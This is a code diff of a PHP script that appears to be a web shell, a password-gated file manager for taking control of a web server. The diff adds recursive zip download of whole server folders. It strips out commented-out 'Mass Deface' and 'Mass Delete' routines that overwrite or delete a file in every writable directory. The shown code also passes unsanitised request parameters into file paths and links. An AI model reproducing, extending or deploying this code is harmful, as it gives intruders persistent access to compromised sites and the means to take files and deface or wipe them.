@@ -1,5 +1,6 @@
 <?php
 
+ob_start();
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -20,18 +21,96 @@ if (isset($_GET['dir'])) {
 $path = str_replace('\\', '/', $path);
 $exdir = explode('/', $path);
 
+
+
+
+/**
+ * @throws Exception
+ */
+function Zip($source, $destination)
+{
+    if (!extension_loaded('zip') || !file_exists($source)) {
+        if (!extension_loaded('zip')) {
+            throw new Exception('Zip extension not enabled on this server.');
+        }
+        if (!file_exists($source)) {
+            throw new Exception('File does not exist!');
+        }
+    }
+
+    class ExtendedZip extends ZipArchive {
+
+        // Member function to add a whole file system subtree to the archive
+        public function addTree($dirname, $localname = '') {
+            if ($localname)
+                $this->addEmptyDir($localname);
+            $this->_addTree($dirname, $localname);
+        }
+
+        // Internal function, to recurse
+        protected function _addTree($dirname, $localname) {
+            $dir = opendir($dirname);
+            while ($filename = readdir($dir)) {
+                // Discard . and ..
+                if ($filename == '.' || $filename == '..')
+                    continue;
+
+                // Proceed according to type
+                $path = $dirname . DIRECTORY_SEPARATOR . $filename;
+                $localpath = $localname ? ($localname . DIRECTORY_SEPARATOR . $filename) : $filename;
+                if (is_dir($path)) {
+                    // Directory: add & recurse
+                    $this->addEmptyDir($localpath);
+                    $this->_addTree($path, $localpath);
+                }
+                else if (is_file($path)) {
+                    // File: just add
+                    $this->addFile($path, $localpath);
+                }
+            }
+            closedir($dir);
+        }
+
+        // Helper function
+        public static function zipTree($dirname, $zipFilename, $flags = 0, $localname = '') {
+            $zip = new self();
+            $zip->open($zipFilename, $flags);
+            $zip->addTree($dirname, $localname);
+            $zip->close();
+        }
+    }
+
+    ExtendedZip::zipTree($source, $destination, ZipArchive::CREATE);
+}
+
 if (isset($_GET['action']) && $_GET['action'] == 'download') {
     @ob_clean();
-    $file = $_GET['item'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: text/plain');
-    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
+    $item = $path . DIRECTORY_SEPARATOR . $_GET['item'];
+    if (is_file($item)) {
+        header('Content-Type: text/plain');
+    } else if (is_dir($item)) {
+        $new_item = $path . DIRECTORY_SEPARATOR . 'compressed_folder_' . basename($item) . '.zip';
+        try {
+            Zip($item, $new_item);
+            $item = $new_item;
+            header('Content-type: application/zip');
+        } catch (Exception $e) {
+            flash($e->getMessage(), "Failed", "error", "?dir=$path");
+        }
+    }
+    if (is_file($item)) {
+        header('Content-Description: File Transfer');
+        header('Content-Disposition: attachment; filename="' . basename($item) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($item));
+        readfile($item);
+        if(isset($new_item) && is_file($new_item)){
+            unlink($new_item);
+        }
+        exit;
+    }
 }
 
 function flash($message, $status, $class, $redirect = false)
@@ -200,61 +279,6 @@ function getOwner($item)
     }
     return $downer . '/' . $dgrp;
 }
-
-// Mass Deface
-/*function massdef($dir, $file, $content)
-{
-    if (is_writable($dir)) {
-        $dira = scandir($dir);
-        foreach ($dira as $dirb) {
-            $dirc = "$dir/$dirb";
-            $lokasi = $dirc . '/' . $file;
-            if ($dirb === '.') {
-                file_put_contents($lokasi, $content);
-            } elseif ($dirb === '..') {
-                file_put_contents($lokasi, $content);
-            } else {
-                if (is_dir($dirc)) {
-                    if (is_writable($dirc)) {
-                        echo "$dirb/$file\n";
-                        file_put_contents($lokasi, $content);
-                    }
-                }
-            }
-        }
-    }
-}
-
-// Mass Delete
-function massdel($dir, $file)
-{
-    if (is_writable($dir)) {
-        $dira = scandir($dir);
-        foreach ($dira as $dirb) {
-            $dirc = "$dir/$dirb";
-            $lokasi = $dirc . '/' . $file;
-            if ($dirb === '.') {
-                if (file_exists("$dir/$file")) {
-                    unlink("$dir/$file");
-                }
-            } elseif ($dirb === '..') {
-                if (file_exists('' . dirname($dir) . "/$file")) {
-                    unlink('' . dirname($dir) . "/$file");
-                }
-            } else {
-                if (is_dir($dirc)) {
-                    if (is_writable($dirc)) {
-                        if ($lokasi) {
-                            echo "$lokasi > Deleted\n";
-                            unlink($lokasi);
-                            $massdel = massdel($dirc, $file);
-                        }
-                    }
-                }
-            }
-        }
-    }
-}*/
 
 if (isset($_POST['newFolderName'])) {
     if (mkdir($path . '/' . $_POST['newFolderName'])) {
@@ -514,16 +538,13 @@ $dirs = scandir($path);
 
 
 <?php
-ob_start();
-session_start();
 if (isset($_GET['logout']) && $_GET['logout'] === 'true') {
     unset($_SESSION['valid']);
     unset($_SESSION['username']);
 }
 
 
-if (!isset($_SESSION['username'])) {
-    ?>
+if (!isset($_SESSION['username'])) : ?>
     <div class="container form-signin">
 
         <?php
@@ -531,7 +552,6 @@ if (!isset($_SESSION['username'])) {
 
         if (isset($_POST['login']) && !empty($_POST['username'])
             && !empty($_POST['password'])) {
-
             if ($_POST['username'] == '####USERNAME####' &&
                 $_POST['password'] == '####PASSWORD####') {
                 $_SESSION['valid'] = true;
@@ -564,7 +584,7 @@ if (!isset($_SESSION['username'])) {
     </div>
 
 
-<?php } else { ?>
+<?php else : ?>
 
 
     <div class="container-fluid">
@@ -625,12 +645,6 @@ if (!isset($_SESSION['username'])) {
                         <a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#upload"
                            role="button"
                            aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
-                        <!--                    <a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#massDef" role="button"-->
-                        <!--                       aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-layer-group"></i> Mass-->
-                        <!--                        Deface</a>-->
-                        <!--                    <a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#massDel" role="button"-->
-                        <!--                       aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-eraser"></i> Mass-->
-                        <!--                        Delete</a>-->
                         <a class="m-1 btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#info" role="button"
                            aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-info-circle"></i> Info
                             Server</a>
@@ -701,55 +715,6 @@ if (!isset($_SESSION['username'])) {
                                     </div>
                                 </div>
                             </div>
-                            <!--                        <div class="col-md-12">-->
-                            <!--                            <div class="collapse" id="massDef" data-bs-parent="#tool">-->
-                            <!--                                <div class="row justify-content-center">-->
-                            <!--                                    <div class="col-md-5">-->
-                            <!--                                        <form action="" method="post">-->
-                            <!--                                            <div class="mb-3">-->
-                            <!--                                                <label class="form-label">Directory</label>-->
-                            <!--                                                <input type="text" class="form-control" name="massDefDir"-->
-                            <!--                                                       value="-->
-                            <? //= $path ?><!--">-->
-                            <!--                                            </div>-->
-                            <!--                                            <div class="mb-3">-->
-                            <!--                                                <label class="form-label">File Name</label>-->
-                            <!--                                                <input type="text" class="form-control" name="massDefName"-->
-                            <!--                                                       placeholder="test.php">-->
-                            <!--                                            </div>-->
-                            <!--                                            <div class="mb-3">-->
-                            <!--                                                <label class="form-label">File Content</label>-->
-                            <!--                                                <textarea class="form-control" name="massDefContent" rows="5"-->
-                            <!--                                                          placeholder="Hello World"></textarea>-->
-                            <!--                                            </div>-->
-                            <!--                                            <button class="btn btn-outline-light" type="submit">Submit</button>-->
-                            <!--                                        </form>-->
-                            <!--                                    </div>-->
-                            <!--                                </div>-->
-                            <!--                            </div>-->
-                            <!--                        </div>-->
-                            <!--                        <div class="col-md-12">-->
-                            <!--                            <div class="collapse" id="massDel" data-bs-parent="#tool">-->
-                            <!--                                <div class="row justify-content-center">-->
-                            <!--                                    <div class="col-md-5">-->
-                            <!--                                        <form action="" method="post">-->
-                            <!--                                            <div class="mb-3">-->
-                            <!--                                                <label class="form-label">Directory</label>-->
-                            <!--                                                <input type="text" class="form-control" name="massDel"-->
-                            <!--                                                       value="-->
-                            <? //= $path ?><!--">-->
-                            <!--                                            </div>-->
-                            <!--                                            <div class="mb-3">-->
-                            <!--                                                <label class="form-label">File Name</label>-->
-                            <!--                                                <input type="text" class="form-control" name="massDelName"-->
-                            <!--                                                       placeholder="test.php">-->
-                            <!--                                            </div>-->
-                            <!--                                            <button class="btn btn-outline-light" type="submit">Submit</button>-->
-                            <!--                                        </form>-->
-                            <!--                                    </div>-->
-                            <!--                                </div>-->
-                            <!--                            </div>-->
-                            <!--                        </div>-->
                             <div class="col-md-12">
                                 <div class="collapse" id="info" data-bs-parent="#tool">
                                     <div class="row justify-content-center">
@@ -861,29 +826,6 @@ if (!isset($_SESSION['username'])) {
                             </div>
                         </div>
                     <?php endif; ?>
-
-                    <!--                --><?php //if (isset($_POST['massDefDir']) && isset($_POST['massDefName']) && isset($_POST['massDefContent'])) : ?>
-                    <!--                    <div class="p-2">-->
-                    <!--                        <div class="row justify-content-center">-->
-                    <!--                            <div class="card text-dark col-md-6 mb-3">-->
-                    <!--                                <pre>Done ~~<br><br>-->
-                    <? //= massdef($_POST['massDefDir'], $_POST['massDefName'], $_POST['massDefContent']) ?><!--</pre>-->
-                    <!--                            </div>-->
-                    <!--                        </div>-->
-                    <!--                    </div>-->
-                    <!--                --><?php //endif; ?>
-                    <!---->
-                    <!--                --><?php //if (isset($_POST['massDel']) && isset($_POST['massDelName'])) : ?>
-                    <!--                    <div class="p-2">-->
-                    <!--                        <div class="row justify-content-center">-->
-                    <!--                            <div class="card text-dark col-md-6 mb-3">-->
-                    <!--                                <pre>Done ~~<br><br>-->
-                    <? //= massdel($_POST['massDel'], $_POST['massDelName']) ?><!--</pre>-->
-                    <!--                            </div>-->
-                    <!--                        </div>-->
-                    <!--                    </div>-->
-                    <!--                --><?php //endif; ?>
-
                     <?php if (isset($_GET['action']) && $_GET['action'] != 'download') : $action = $_GET['action'] ?>
                     <?php endif; ?>
                     <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
@@ -989,10 +931,17 @@ if (!isset($_SESSION['username'])) {
                                             <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename"
                                                class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip"
                                                data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
-                                            <a class="btn btn-outline-light btn-sm mr-1"
-                                               onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"
-                                               data-toggle="tooltip" data-placement="auto" title="Delete"><i
-                                                        class="fa fa-trash"></i></a>
+                                            <?php if (extension_loaded('zip')) : ?>
+
+                                                <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=download"
+                                                   class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip"
+                                                   data-placement="auto" title="Download"><i
+                                                            class="fa fa-file-download"></i></a>
+                                                <a class="btn btn-outline-light btn-sm mr-1"
+                                                   onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"
+                                                   data-toggle="tooltip" data-placement="auto" title="Delete"><i
+                                                            class="fa fa-trash"></i></a>
+                                            <?php endif; ?>
                                         </div>
                                     <?php elseif ($dir === '.') : ?>
                                         <div class="btn-group">
@@ -1108,4 +1057,4 @@ if (!isset($_SESSION['username'])) {
     </body>
     </html>
 
-<?php } ?>
+<?php endif; ?>
